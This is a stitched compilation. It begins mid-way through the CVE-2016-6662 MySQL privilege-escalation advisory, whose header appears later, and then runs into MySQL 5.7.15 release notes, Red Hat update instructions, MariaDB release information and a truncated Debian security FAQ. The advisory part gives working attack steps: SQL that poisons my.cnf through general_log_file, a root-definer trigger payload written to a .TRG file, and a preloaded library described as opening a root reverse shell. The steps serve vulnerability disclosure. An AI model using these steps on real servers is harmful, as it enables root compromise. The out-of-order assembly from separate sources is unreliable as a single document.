* SCENARIO 2 (point 2 above) is _independent_ of SCENARIO 1 (point 1 above).
I.e the config injection vulnerability which ultimately leads to loading
arbitrary malicious shared libraries CAN be exploited EVEN if there are NO
my.cnf config files with insecure permissions available on the system.
In other words, weak permissions are NOT a requirement for exploitation, and
the vulnerability CAN be exploit on affected DEFAULT PerconaDB/MariaDB/MySQL
installations with CORRECT permissions set on ALL my.cnf files available on
the system by default.
The SCENARIO 1 has only been presented as it makes the exploit code much
simpler and allows to explain the logging abuse/config injection vulnerability
without exposing default installations (SCENARIO 2) to an immediate risk.

* The researcher has created a private working PoC that has not been shared
publicly which CAN successfully exploit SCENARIO 2 (default setup/no incorrect
permissions on any of the default my.cnf config files). As noted both in the
section below as well as in the current PoC exploit's comments, the current
PoC is limited. It has been purposefully limited to protect immediate
exploitation of default installations (no incorrect perms on my.cnf) and give
users time to react to the vulnerability.

* A successful exploitation of SCENARIO 2 (no my.cnf available with weak perms)
leading to root privilege escalation/code execution can _ALSO_ (however is NOT a
requirement) be achieved by means of a (separate) vulnerability: CVE-2016-6663.
PoC has been created by the author of this advisory but not released publicly.

* The logging facility CAN be accessed by standard users with SELECT/FILE
privileges only. I.e SUPER privilege is NOT required to create malicious triggers
which contain the malicious payload that grants the attacker access to the
logging facility DESPITE the LACK of administrative privileges.
This has been explained in the section below (see point 3 in the section below)
and proven in the current PoC in this advisory and can also be observed in the
replication steps (see VI. section) that show the attacker database account
permissions (the attacker DB account is NOT assigned SUPER permissions).

* The exploitation requires a restart that could happen via a number of ways.
Attackers might also be able to speed up the server restart remotely by issuing
a SHUTDOWN SQL statement or 'shutdown' command via mysqladmin.

V. PROOF OF CONCEPT
-------------------------

1) Inject malicious configuration into existing MySQL configuration files on
systems with weak/improper permissions (configs owned by/writable by mysql user).
(SCENARIO 1)
~~~~~~~~~~~~~~~~~~~~~~~~~

MySQL configuration files are loaded from all supported locations and processed
one by one when mysqld_safe script is executed.

Exact config locations depend on MySQL version.
For example, as described on:
<http://dev.mysql.com/doc/refman/5.5/en/option-files.html>
for MySQL 5.5 the config locations include:

/etc/my.cnf	        Global options
/etc/mysql/my.cnf	Global options
SYSCONFDIR/my.cnf	Global options
$MYSQL_HOME/my.cnf	Server-specific options
defaults-extra-file	The file specified with --defaults-extra-file=file_name, if any
~/.my.cnf	User-specific options

There is a common misconception that mysql config files should be owned by mysql
user for the server to work properly.
Many installation guides, or even security guides often wrongly advise users
to set the ownership of mysql config files/directories such as /etc/mysql
or /etc/my.cnf to mysql user.

For example:
<https://github.com/willfong/mariadb-backup/blob/master/README.md>
says:

"Lock down permissions on config file(s)

chown mysql /etc/my.cnf
chmod 600 /etc/my.cnf"

Whereas the article at:
<http://www.devshed.com/c/a/mysql/security-issues-with-mysql/>
mentions:

"You should also protect the global option file, /etc/my.cnf, if it exists.
The mysql user should own it and have read/write access to it, but other users
need only read access:

shell> chown mysql /etc/my.cnf"

Moreover, there are also MySQL recipes for installation automation software
such as Chef that also provide users with vulnerable permissions on my.cnf
config files.

If any of the MySQL config files is owned by mysql user, an attacker could
append malicious config entries to it as follows:

root@debian:~/# ls -l /etc/my.cnf
-rw-r--r-- 1 mysql mysql 72 Jul 28 17:20 /etc/my.cnf

root@debian:~/# cat /etc/my.cnf

[mysqld]

key_buffer              = 16M
max_allowed_packet      = 16M

Attacker could run the following SQL queries:

mysql> set global general_log_file = '/etc/my.cnf';
mysql> set global general_log = on;
mysql> select '
    '>
    '> ; injected config entry
    '>
    '> [mysqld]
    '> malloc_lib=/tmp/mysql_exploit_lib.so
    '>
    '> [separator]
    '>
    '> ';
1 row in set (0.00 sec)
mysql> set global general_log = off;

The resulting config would then have the following part appended:

root@debian:~/# cat /etc/my.cnf

[mysqld]

key_buffer              = 16M
max_allowed_packet      = 16M

/usr/sbin/mysqld, Version: 5.5.50-0+deb8u1 ((Debian)). started with:
Tcp port: 3306  Unix socket: /var/run/mysqld/mysqld.sock
Time                 Id Command    Argument
160728 17:25:14	   40 Query	select '

; injected config entry

[mysqld]
malloc_lib=/tmp/mysql_exploit_lib.so

[separator]

'
160728 17:25:15	   40 Query	set global general_log = off

This config contains some redundant information that would normally cause MySQL
to fail to startup during a restart due to parsing issues.

However, the important part is that the config now contains the section:

[mysqld]
malloc_lib=/tmp/mysql_exploit_lib.so

mysqld_safe will read the shared library path correctly and add it to
the LD_PRELOAD environment variable before the startup of mysqld daemon.
The preloaded library can then hook the libc fopen() calls and clean up
the config before it is ever processed by mysqld daemon in order for it
to start up successfully so that the compromise goes unnoticed by the
system administrators etc.

~~~~~~~~~~~~~~~~~~~~~~~~~
2) Create new configuration files within a MySQL data directory (writable
by MySQL by default) on _default_ MySQL installs without the need to rely on
improper config permissions.
(SCENARIO 2)

Analysis of the mysqld_safe script has shown that in addition to the
config locations provided above, mysqld_safe also loads the configuration file
from the mysql data directory (/var/lib/mysql/my.cnf) by default as can be
seen below:

----[ /usr/bin/mysqld_safe ]----

[...]
# Try where the binary installs put it
if test -d $MY_BASEDIR_VERSION/data/mysql
then
  DATADIR=$MY_BASEDIR_VERSION/data
  if test -z "$defaults" -a -r "$DATADIR/my.cnf"
  then
    defaults="--defaults-extra-file=$DATADIR/my.cnf"
  fi
[...]

----------[ eof ]---------------

on MySQL versions in branches 5.5 and 5.6.
The datadir location for my.cnf has only been removed from MySQL starting
from 5.7 branch however in many configurations it will still load config
from:

/var/lib/mysql/.my.cnf

The data directory /var/lib/mysql is (obviously) writable by mysql user on
every install:

root@debian:~# ls -ld /var/lib/mysql/
drwx------ 4 mysql mysql 4096 Jul 28 06:41 /var/lib/mysql/

Therefore, if no mysql-owned configs are available on the system, an attacker
could still be able to exploit the vulnerability by creating a config at the
following locations:

/var/lib/mysql/my.cnf
/var/lib/mysql/.my.cnf

As mentioned, using FILE permission to create such a file with the SQL statement:

SELECT 'malicious config entry' INTO OUTFILE '/var/lib/mysql/my.cnf'

would not work, as MySQL creates files with rw permissions for the world:

-rw-rw-rw- 1 mysql mysql 4 Jul 28 07:46 /var/lib/mysql/my.cnf

and MySQL would prevent such world-writable config from being loaded at startup.

Attackers could bypass this however by using these logging SQL statements:

mysql> set global general_log_file = '/var/lib/mysql/my.cnf';
mysql> set global general_log = on;
mysql> select '
    '>
    '> ; injected config entry
    '>
    '> [mysqld]
    '> malloc_lib=/var/lib/mysql/mysql_hookandroot_lib.so
    '>
    '> [separator]
    '>
    '> ';
1 row in set (0.00 sec)
mysql> set global general_log = off;

The queries will create the my.cnf file with the necessary permissions
(without o-w bit) for it to be parsed by the MySQL daemon:

# ls -l /var/lib/mysql/my.cnf
-rw-rw---- 1 mysql mysql 352 Jul 28 17:48 /var/lib/mysql/my.cnf

The file will have the following contents:

# cat /var/lib/mysql/my.cnf
/usr/sbin/mysqld, Version: 5.5.50-0+deb8u1 ((Debian)). started with:
Tcp port: 3306  Unix socket: /var/run/mysqld/mysqld.sock
Time                 Id Command    Argument
160728 17:48:22	   43 Query	select '

; injected config entry

[mysqld]
malloc_lib=/var/lib/mysql/mysql_hookandroot_lib.so

[separator]

'
160728 17:48:23	   43 Query	set global general_log = off

One problem will remain however. MySQL will refuse files that do not start with
a valid [section] header with the message:

error: Found option without preceding group in config file: /var/lib/mysql/my.cnf at line: 1
Fatal error in defaults handling. Program aborted

Further testing has however proven that IT IS possible to bypass this security
restriction as well but this will not be included in this advisory/PoC for the
time being.

It is worth to note that attackers could use one of the other vulnerabilities
discovered by the author of this advisory which has been assigned a CVEID of
CVE-2016-6663 and is pending disclosure.
The undisclosed vulnerability makes it easy for certain attackers to create
/var/lib/mysql/my.cnf file with arbitrary contents without the FILE privilege
requirement.

~~~~~~~~~~~~~~~~~~~~~~~~~
3) Attackers with only SELECT/FILE permissions can gain access to logging functions
(normally only available to MySQL admin users) on all of the _default_ MySQL
installations and thus be in position to add/modify MySQL config files.

If attackers do not have administrative rights required to access logging settings
and only have standard user privileges with the addition of FILE privilege then
they could still gain the ability to write to / modify configuration files.

This could be achieved by writing a malicious trigger payload - a trigger
definition that is an _equivalent_ to the following statement:

CREATE DEFINER=`root`@`localhost` TRIGGER appendToConf
AFTER INSERT
   ON `active_table` FOR EACH ROW
BEGIN
   DECLARE void varchar(550);
   set global general_log_file='/var/lib/mysql/my.cnf';
   set global general_log = on;
   select "
[mysqld]
malloc_lib='/var/lib/mysql/mysql_hookandroot_lib.so'

" INTO void;
   set global general_log = off;
END;

into a trigger definition/configuration file (.TRG) of an actively used table
('active_table') with the use of a statement similar to:

SELECT '...trigger_definition...' INTO DUMPFILE /var/lib/mysql/activedb/active_table.TRG'

Note that _only_ the above SELECT statement is required to write out the trigger
definition by abusing the power of FILE privilege.
The CREATE TRIGGER statement is _never_ executed and is not necessary. This
means that SUPER privilege is not necessary either. See the exploit code for
details.

Such trigger will be loaded when tables get flushed. From this point on
whenever an INSERT statement is invoked on the table, e.g:

INSERT INTO `active_table` VALUES('xyz');

The trigger's code will be executed with mysql root/admin privileges (notice
'DEFINER' above) and will thus let attacker to modify the general_log settings
despite the lack of administrative/SUPER privileges through their user account
(with SELECT/FILE privileges only).

MySQL / MariaDB / Percona -  Remote Root Code Execution / Privesc PoC Exploit
CVE-2016-6662
mysql_hookandroot_lib.c

This is the shared library injected by 0ldSQL_MySQL_RCE_exploit.py exploit.
The library is meant to be loaded by mysqld_safe on mysqld daemon startup
to create a reverse shell that connects back to the attacker's host on
6603 port (mysql port in reverse ;) and provides a root shell on the
target.

mysqld_safe will load this library through the following setting:

[mysqld]
malloc_lib=mysql_hookandroot_lib.so

in one of the my.cnf config files (e.g. /etc/my.cnf).

This shared library will hook the execvp() function which is called
during the startup of mysqld process.
It will then fork a reverse shell and clean up the poisoned my.cnf
file in order to let mysqld run as normal so that:
'service mysql restart' will work without a problem.

Before compiling adjust IP / PORT and config path.

------------------------------------------------

Replication / testing:
~~~~~~~~~~~~~~~~~~

As admin on the target system:
~~~~~~~~

1. Set up a test database account/permissions:

CREATE DATABASE pocdb;
GRANT FILE ON *.* TO 'attacker'@'%' IDENTIFIED BY 'p0cpass!';
GRANT SELECT, INSERT, CREATE ON `pocdb`.* TO 'attacker'@'%';

2.  Simulate write access on any of available mysql configs.
It just needs to be a valid/parsable config with section e.g:

[isamchk]
key_buffer		= 16M

For example, /etc/mysql/my.cnf on Debian:

# chown mysql:mysql /etc/mysql/my.cnf

# ls -l /etc/mysql/my.cnf
-rw-r--r-- 1 mysql mysql 3534 Sep 11 02:15 /etc/mysql/my.cnf

3. Run the exploit as the attacker and restart mysql when exploit
is done.

Note that attackers could be able to force this step remotely by
issuing a remote SHUTDOWN command/SQL statement.

As attacker:
~~~~~~~~

1. Enter your library path in mysql_hookandroot_lib.c src.

2. Run the 0ldSQL_MySQL_RCE_exploit.py script.

Example run:
~~~~~~~~

attacker$ ./0ldSQL_MySQL_RCE_exploit.py -dbuser attacker -dbpass 'p0cpass!' -dbhost 192.168.1.10 -dbname pocdb -mycnf /etc/mysql/my.cnf

VII. BUSINESS IMPACT
-------------------------

As discussed above the vulnerability could be exploited by attackers with both
privileged and unprivileged (with FILE privilege only) access to mysql accounts.
It could also be combined with CVE-2016-6663 vulnerability which will be released
shortly and could allow certain attackers to escalate their privileges to root
even without FILE privilege.

The vulnerability could also be exploited via an SQL injection vector, which
removes the need for the attackers to have direct mysql connection and increases
the risk of exploitation.

Successful exploitation could gain a attacker a remote shell with root privileges
which would allow them to fully compromise the remote system.

If exploited, the malicious code would run as soon as MySQL daemon gets
restarted.
As mentioned, the restart could be triggered manually, via a system update,
package update (including an update of dependencies), system reboot etc.).
Attackers might also be able to speed up the server restart remotely by issuing
a SHUTDOWN SQL statement or 'shutdown' command via mysqladmin.

VIII. SYSTEMS AFFECTED
-------------------------

All MySQL versions from the oldest versions to the latest shown at the beginnig
of this advisory.

Some systems run MySQL via Systemd and provide direct startup path to mysqld
daemon instead of using mysqld_safe wrapper script. These systems however are
also at risk as mysqld_safe may be called on update by the installation scripts
or some other system services. It could also be triggered manually by
administrators running mysqld_safe as a habit.

Because the exploit only accesses files normally used by MySQL server (
such as the config), and the injected library is preloaded by mysqld_safe startup
scripta not included within the default policies, the vulnerability can be
exploited even if security modules as SELinux and AppArmor are installed with
active security policies for the MySQL daemon.

IX. VENDOR RESPONSE / SOLUTION
-------------------------

The vulnerability was reported to Oracle on 29th of July 2016 and triaged
by the security team.
It was also reported to the other affected vendors including PerconaDB and MariaDB.

The vulnerabilities were patched by PerconaDB and MariaDB vendors in all branches
by 30th of August.
During the course of the patching process by these vendors the patches went into
public repositories and the fixed security issues were also mentioned in the
new releases which could be noticed by malicious attackers.

As over 40 days have passed since reporting the issues and patches were already
mentioned publicly (by Percona and MariaDB) , a decision was made to start
disclosing vulnerabilities (with limited PoC) to inform users about the risks
before the vendor's next CPU update (scheduled for 18th of October).

No official patches or mitigations are available at this time from the vendor.
As temporary mitigations, users should ensure that no mysql config files are
owned by mysql user, and create root-owned dummy my.cnf files that are not in
use.
These are by no means a complete solution and users should apply official vendor
patches as soon as they become available.

Update (16/09/2016):
It has been found that the vendor silently (i.e. without notifing the researcher
via a direct communication despite the ongoing private communication via email,
nor via releasing an immediate public Security Alert to publicly announce the
critical fixes) released security patches for the CVE-2016-6662 vulnerability in
the following releases:

<https://dev.mysql.com/doc/relnotes/mysql/5.7/en/news-5-7-15.html>
<https://dev.mysql.com/doc/relnotes/mysql/5.6/en/news-5-6-33.html>
<https://dev.mysql.com/doc/relnotes/mysql/5.5/en/news-5-5-52.html>

which changes the vulnerable/exploitable version list to the following:

MySQL  <= 5.7.14
	  5.6.32
 	  5.5.51

Subject: CVE-2016-6662 - MySQL Remote Root Code Execution / Privilege
 Escalation ( 0day )

Vulnerability: MySQL Remote Root Code Execution / Privilege Escalation 0day
CVE: CVE-2016-6662
Severity: Critical
Affected MySQL versions (including the latest):
<= 5.7.15
<= 5.6.33
<= 5.5.52

Discovered by:
Dawid Golunski
<http://legalhackers.com>

An independent research has revealed multiple severe MySQL vulnerabilities.
This advisory focuses on a critical vulnerability with a CVEID of CVE-2016-6662.
The vulnerability affects MySQL servers in all version branches
(5.7, 5.6, and 5.5) including the latest versions, and could be exploited by
both local and remote attackers.
Both the authenticated access to MySQL database (via network
connection or web interfaces such as phpMyAdmin) and SQL Injection
could be used as exploitation vectors.

Successful exploitation could allow attackers to execute arbitrary code with
root privileges which would then allow them to fully compromise the server on
which an affected version of MySQL is running.

This advisory provides a (limited) Proof-Of-Concept MySQL exploit
which demonstrates how Remote Root Code Execution could be achieved by
attackers.
Full PoC (which works on default installations without the need for
the attacker to find writable config files) will be provided later on
to give users a chance to react to this advisory as the issue has not
been patched by all the
affected vendors yet despite efforts.

The exploitation is interesting in the way that it involves an
oldschool LD_PRELOAD environment variable and that it targets a
service that doesn't
serve requests as root but could still be tricked to get root RCE when
restarted.
Might give you strange feelings when restarting mysql service the next time ;)

Changes in MySQL 5.7.15 (2016-09-06, General Availability)

## Changes in MySQL 5.7.15 (2016-09-06, General Availability)

* [Security Notes](news-5-7-15.html#mysqld-5-7-15-security "Security Notes")
* [Test Suite Notes](news-5-7-15.html#mysqld-5-7-15-test-suite "Test Suite Notes")
* [Functionality Added or Changed](news-5-7-15.html#mysqld-5-7-15-feature "Functionality Added or Changed")
* [Bugs Fixed](news-5-7-15.html#mysqld-5-7-15-bug "Bugs Fixed")

### Security Notes

* The `validate_password` plugin now supports the
  capability of rejecting passwords that match the current session
  user name, either forward or in reverse. To enable control over
  this capability, the plugin exposes a
  [`validate_password_check_user_name`](/doc/refman/5.7/en/validate-password-options-variables.html#sysvar_validate_password_check_user_name)
  system variable. By default, this variable is disabled; the
  default will change to enabled in MySQL 8.0. For more
  information, see
  [Password Validation Plugin Options and Variables](/doc/refman/5.7/en/validate-password-options-variables.html).
  (WL #9480)

### Test Suite Notes

* In **mysql-test-run.pl**, a limit of 50 was
  imposed on the number of workers for parallel testing, which on
  systems with more than 50 CPUs resulted in exhaustion of unique
  thread IDs. The ID-exhaustion problem has been corrected, and
  the limit of 50 on number of workers has been lifted. Thanks to
  Daniel Black for the patch on which this change was based.
  Additionally, these changes were made:

  + To avoid idle workers, the number of parallel workers now is
    limited to the number of tests.
  + Previously, if `--parallel=auto` was given
    and the `MTR_MAX_PARALLEL` environment
    variable was not set, a limit of 8 was imposed on the number
    of parallel workers. This limit has been lifted.

  (Bug #22342399, Bug #79585)

### Functionality Added or Changed

* **InnoDB:**
  A new dynamic configuration option,
  [`innodb_deadlock_detect`](/doc/refman/5.7/en/innodb-parameters.html#sysvar_innodb_deadlock_detect), may be
  used to disable deadlock detection. On high concurrency systems,
  deadlock detection can cause a slowdown when numerous threads
  wait for the same lock. At times, it may be more efficient to
  disable deadlock detection and rely on the
  [`innodb_lock_wait_timeout`](/doc/refman/5.7/en/innodb-parameters.html#sysvar_innodb_lock_wait_timeout)
  setting for transaction rollback when a deadlock occurs.
  (Bug #23477773, WL #9383)
* The systemd support script for the unit file
  (`mysqld_pre_systemd`) now assists in
  creating the error log file only if its location matches the
  pattern /var/log/mysql\*.log. In other cases, the error log
  directory must be writable or the error log must be present and
  writable for the user running the **mysqld**
  process. Also, `mysqld_pre_systemd` now
  avoids creating insecure temporary files.
  (Bug #24516262)
* The **CMake**
  [`WITH_LZ4`](/doc/refman/5.7/en/source-configuration-options.html#option_cmake_with_lz4) option has been added to
  control which LZ4 library is used during compilation. By default
  [`WITH_LZ4`](/doc/refman/5.7/en/source-configuration-options.html#option_cmake_with_lz4) is set to
  `bundled`, so the library provided with MySQL
  is used. Setting [`WITH_LZ4`](/doc/refman/5.7/en/source-configuration-options.html#option_cmake_with_lz4) to
  `system` uses the LZ4 library from the
  operating system.
  (Bug #23607230)

### Bugs Fixed

* **InnoDB:**
  An [`ALTER TABLE ...
  ENCRYPTION='Y', ALGORITHM=COPY`](/doc/refman/5.7/en/alter-table.html) operation on a table
  residing in the system tablespace raised an assertion.
  (Bug #24381804)
* **InnoDB:**
  Creating an encrypted table on a Fusion-io disk with an
  [`innodb_flush_method`](/doc/refman/5.7/en/innodb-parameters.html#sysvar_innodb_flush_method) setting of
  `O_DIRECT` caused a fatal error.
  (Bug #24329079, Bug #82073)
* **InnoDB:**
  An operation that dropped and created a full-text search table
  raised an assertion.
  (Bug #24315031)
* **InnoDB:**
  Accessing full-text search auxiliary tables while dropping the
  indexed table raised an assertion.
  (Bug #24009272)
* **InnoDB:**
  An online DDL operation on a table with indexed
  [`BLOB`](/doc/refman/5.7/en/blob.html) columns raised an assertion
  during logging of table modifications.
  (Bug #23760086)
* **InnoDB:**
  In some cases, code that locates a buffer pool chunk
  corresponding to given pointer returned the wrong chunk. Thanks
  to Alexey Kopytov for the patch.
  (Bug #23631471, Bug #79378)
* **InnoDB:**
  A global counter (`ut_rnd_ulint_counter`) was
  changed to a thread-local counter to make it scalable on
  multi-core systems.
  (Bug #22733635, Bug #80354)
* **Replication:**
  The addition of the
  [`transaction-write-set-extraction=XXH64`](/doc/refman/5.7/en/replication-options-binary-log.html#sysvar_transaction_write_set_extraction)
  option uses xxHash symbols from liblz4. Although the xxHash
  symbols are exported by liblz4, the header file is not part of
  the API, so compilation failed when building with
  [`WITH_LZ4=system`](/doc/refman/5.7/en/source-configuration-options.html#option_cmake_with_lz4). The fix ensures
  that xxHash is built separately from liblz4 so that it is
  available both when using the system and bundled LZ4 libraries.
  (Bug #82426, Bug #24399819)

  References: See also: Bug #23607230.
* **Replication:**
  **mysqlbinlog --read-from-remote-server log1
  log2** was opening a new connection for
  `log2` without freeing the connection used for
  `log1`. Thanks to Laurynas Biveinis for the
  contribution.
  (Bug #81675, Bug #23540182)
* **Replication:**
  The MTR binary log test suite failed to clean up copied files.
  Thanks to Daniel Black for the contribution.
  (Bug #80881, Bug #23016254)
* **Replication:**
  With [`binlog_row_image=FULL`](/doc/refman/5.7/en/replication-options-binary-log.html#sysvar_binlog_row_image),
  when updating single tables temporary tables were unnecessarily
  being used. The fix ensures single table update follows the same
  pattern as multi-table update.
  (Bug #79867, Bug #22510353)
* **Solaris:**
  The client library failed to build on Solaris using the
  `Cstd` library.
  (Bug #24353920, Bug #82347)
* **mysqld\_safe** attempted to read
  `my.cnf` in the data directory, although that
  is no longer a standard option file location.
  (Bug #24482156)
* For **mysqld\_safe**, the argument to
  [`--malloc-lib`](/doc/refman/5.7/en/mysqld-safe.html#option_mysqld_safe_malloc-lib) now must be one
  of the directories `/usr/lib`,
  `/usr/lib64`,
  `/usr/lib/i386-linux-gnu`, or
  `/usr/lib/x86_64-linux-gnu`. In addition, the
  [`--mysqld`](/doc/refman/5.7/en/mysqld-safe.html#option_mysqld_safe_mysqld) and
  [`--mysqld-version`](/doc/refman/5.7/en/mysqld-safe.html#option_mysqld_safe_mysqld-version) options are
  accepted only on the command line, not in option files.
  (Bug #24464380)

  References: See also: Bug #24619033, Bug #82920.
* It was possible to write log files ending with
  `.ini` or `.cnf` that
  later could be parsed as option files. The general query log and
  slow query log can no longer be written to a file ending with
  `.ini` or `.cnf`.
  (Bug #24388753)
* Privilege escalation was possible by exploiting the way
  [`REPAIR TABLE`](/doc/refman/5.7/en/repair-table.html) used temporary
  files.
  (Bug #24388746)
* If the `basedir` system variable was set at
  server startup from the command line or option file, the value
  was not normalized (on Windows, `/` was not
  replaced with `\`).
  (Bug #23747899, Bug #82125)
* kevent statement timer subsystem deinitialization was revised to
  avoid a **mysqld** hang during shutdown on OS X
  10.12.
  (Bug #23744004, Bug #82097)
* For accounts for which multiple
  [`GRANT`](/doc/refman/5.7/en/grant.html) statements applied,
  **mysqlpump** could fail to dump them all.
  (Bug #23721446)
* The `MYSQL_ADD_PLUGIN` macro had a spelling
  error that caused `MYSQL_SERVER` not to be
  defined.
  (Bug #23508762, Bug #81666)
* In-place [`ALTER TABLE`](/doc/refman/5.7/en/alter-table.html) operations
  which when executed separately caused no table rebuild could
  when combined into a single statement result in a table rebuild.
  (Bug #23475211, Bug #81587)
* For keyring plugins, the data access layer is now created only
  as necessary, not once per operation, which improves keyring
  performance.
  (Bug #23337926)
* A blank server name in [`CREATE
  SERVER`](/doc/refman/5.7/en/create-server.html) statements produced a server exit rather than
  an error.
  (Bug #23295288)
* The optimizer failed to check a function return value for an
  area calculation, leading to a server exit.
  (Bug #23280059)
* The server could fail to free memory allocated for execution of
  queries that used generated columns.
  (Bug #23205454)

  References: This issue is a regression of: Bug #22392268.
* **mysqlpump** output for triggers that contained
  multiple statements in the trigger body failed to load
  correctly.
  (Bug #23072245)
* Queries that satisfied the following conditions could return
  different results than in MySQL 5.6: 1) A subquery appeared in
  the select list; 2) The subquery contained a
  `WHERE` condition that referenced a value in
  the outer query; 3) The outer query contained a `GROUP
  BY` that required creation of a temporary table.
  (Bug #23049975)
* Passwords that were rejected by the
  `validate_password` plugin were written by the
  server to the error log as cleartext.
  (Bug #22922023)
* A prepared statement that used a parameter in the select list of
  a derived table that was part of a join could cause a server
  exit.
  (Bug #22392374, Bug #24380263)
* [`MEDIUMINT`](/doc/refman/5.7/en/integer-types.html) columns used in
  operations with long integer values could result in buffer
  overflow.
  (Bug #19984392)
* A spurious [`ER_NO_SUCH_TABLE`](/doc/mysql-errors/5.7/en/server-error-reference.html#error_er_no_such_table)
  error could occur when attempting to execute a prepared
  `CREATE TABLE ... SELECT` statement that used a
  temporary table in the `FROM` clause and called
  a stored function. The same error could occur for a nonprepared
  version of the statement if used in a stored procedure when the
  procedure was re-executed.
  (Bug #16672723, Bug #68972)
* `EINTR` handling in the client library has been
  fixed so that interrupted read and write calls are retried.
  Previously, `EINTR` was ignored.

## Environment considerations

Red Hat Enterprise Linux starting with versions 6.1 and 5.7 introduced a new Red Hat Subscription Management (RHSM) service. Red Hat Network (RHN) has been decommissioned.

Users that are new to Red Hat or would like the enhanced subscription information and improved content access should use RHSM. If you are still using Red Hat Network, we advise you to [migrate to RHSM as soon as possible](https://access.redhat.com/products/red-hat-subscription-management#migration). Customers using older versions of Red Hat Enterprise Linux must continue using RHN Classic. Refer to [FAQ for Changes to Red Hat's Entitlement Platform with RHEL 6.1 and 5.7](https://access.redhat.com/articles/47844) and [What's the difference between management services provided by Red Hat Network (RHN) Classic and Red Hat Subscription Management (RHSM)?](https://access.redhat.com/articles/63269) for more information on benefits of RHSM over RHN.

* For **Red Hat Enterprise Linux 9**, register the system using RHSM as described in [Registering the system with the Subscription Manager](#rhsm). Then update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 9](#rhel9).
* For **Red Hat Enterprise Linux 8**, register the system using RHSM as described in [Registering the system with the Subscription Manager](#rhsm). Then update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 8](#rhel8).
* For **Red Hat Enterprise Linux 7**, register the system using RHSM as described in [Registering the system with the Subscription Manager](#rhsm). Then update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 7](#rhel7).
* For **Red Hat Enterprise Linux 6**, register the system using RHSM (if RHEL 6.1 or above) as described in [Registering the system with the Subscription Manager](#rhsm). Then update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 6](#rhel6).
* For **Red Hat Enterprise Linux 5**, register the system using RHSM (if RHEL 5.7 or above) as described in [Registering the system with the Subscription Manager](#rhsm). After registration, update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 5](#rhel5).
* If your system cannot connect to the Internet directly, our [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/) offering may be of interest.

## Prerequisites

### Registering the system with the Subscription Manager

#### Graphical interface

Access the Subscription Management GUI client in Red Hat Enterprise Linux 9 via **Activities** and then **Show Applications** which is visible in the Favorites dock by default.

Access the Subscription Management GUI client in Red Hat Enterprise Linux 8 via **Activities**, then select **Show Applications** and click **All**. Then select **Red Hat Subscription Manager**.

In Red Hat Enterprise Linux 7 open **Applications** -> **System Tools** -> **Red Hat Subscription Manager** and in Red Hat Enterprise Linux 6 via **System** -> **Administration** -> **Red Hat Subscription Manager**.

#### Command line

A system can also be registered via the command line by using the "subscription-manager" command. To register your system, either through the GUI or from the command line, follow the instructions in the [Using and Configuring Red Hat Subscription Manager](https://access.redhat.com/documentation/en-US/Red_Hat_Subscription_Management/1/html-single/RHSM/index.html) guide.

Make sure that your firewall allows configuring RHSM, for more information see [How do I access RHSM (yum) through a firewall?](https://access.redhat.com/solutions/65300).

General information on RHSM can be found in [Red Hat Network Subscription Management](https://access.redhat.com/documentation/en-US/Red_Hat_Customer_Portal/1/html/Red_Hat_Network_Certificate-based_Subscription_Management/index.html), while [FAQ for Changes to Red Hat's Entitlement Platform with RHEL 6.1 and 5.7](/knowledge/node/47844) provides a quick overview and a comparison with RHN.

[Now there are multiple short term releases each year](https://mariadb.org/preview-releases/), in addition to less frequent long-term
releases. The current maintained versions are:
[10.5](https://mariadb.com/kb/en/changes-and-improvements-in-mariadb-10-5),
[10.6](https://mariadb.com/kb/en/changes-and-improvements-in-mariadb-10-6),
[10.11](https://mariadb.com/kb/en/changes-and-improvements-in-mariadb-10-11),
[11.4](https://mariadb.com/kb/en/changes-and-improvements-in-mariadb-11-4) (maintained for 5 years),
[11.2](https://mariadb.com/kb/en/changes-and-improvements-in-mariadb-11-2) (maintained for one year).
[11.5](https://mariadb.com/kb/en/changes-and-improvements-in-mariadb-11-5) is a rolling release.
The current rolling release is
[11.6](https://mariadb.com/kb/en/changes-and-improvements-in-mariadb-11-6).

Each stable version receives bug-fixes and security fixes periodically.

The roadmap is visible on [jira.mariadb.org](https://jira.mariadb.org/secure/Dashboard.jspa) (login is required), along with estimated release dates.

## Reporting bugs

The [Reporting Bugs](https://mariadb.com/kb/en/reporting-bugs/) page on the Knowledge Base has details on how to report a bug.

The developers are generally happy to help with verifying bugs. If you need help, ask on [Zulip](https://mariadb.zulipchat.com/), or on the [maria-developers mailing list](https://lists.mariadb.org/postorius/lists/developers.lists.mariadb.org/).

If the bug is repeatable, it is very helpful if you create a test case for the bug for use with [mysql-test-run](https://mariadb.com/kb/en/mysql-test-run/). See [Debugging MariaDB with mysql-test-run](https://mariadb.com/kb/en/debugging-mariadb-with-mysql-test-run/) for more information.

For End of Life releases, MariaDB Foundation will not provide security updates, however **outside contributors are welcome to submit security and bug fixes and backports to no-longer maintained versions**.

*Q: I received a DSA via debian-security-announce, how can I upgrade the vulnerable packages?*

A: As the DSA mail says, you should upgrade the packages affected by the
announced vulnerability. You can do this by just upgrading (after
updating the list of available packages with apt-get update)
every package in your system with apt-get upgrade or by
upgrading just a particular package, with apt-get install
*package*.

The announcement mail mentions the source package in which the vulnerability
was present. Therefore, you should update all the binary packages from
that source package. To check the binary packages to update, visit
https://packages.debian.org/src:*source-package-name* and
click on *[show ... binary packages]* for the distribution you
are updating.

It may also be necessary to restart a service or a running process. The
command [checkrestart](https://manpages.debian.org/checkrestart)
included in the package
[debian-goodies](https://packages.debian.org/debian-goodies)
might help to find which ones.

*Q: The signature on your advisories does not verify correctly!*

A: This is most likely a problem on your end. The
[debian-security-announce](https://lists.debian.org/debian-security-announce/)
list has a filter that only allows messages with a correct signature
from one of the security team members to be posted.

Most likely some piece of mail software on your end slightly changes
the message that breaks the signature. Make sure your software does
not do any MIME encoding or decoding, or tab/space conversions.

Known culprits are fetchmail (with the mimedecode option enabled),
formail (from procmail 3.14 only) and evolution.

*Q: How is security handled in Debian?*

A: Once the security team receives a notification of an incident,
one or more members review it and consider its impact on the stable
release of Debian (i.e. if it's vulnerable or not).
If our system is vulnerable, we work on a fix for the
problem. The package maintainer is contacted as well, if they didn't
contact the security team already. Finally, the fix is tested and
new packages are prepared, which are then compiled on all stable
architectures and uploaded afterwards. After all of that is done,
an advisory is published.

*Q: Why are you fiddling with an old version of that package?*

The most important guideline when making a new package that fixes a
security problem is to make as few changes as possible. Our users and
developers are relying on the exact behaviour of a release once it is made,
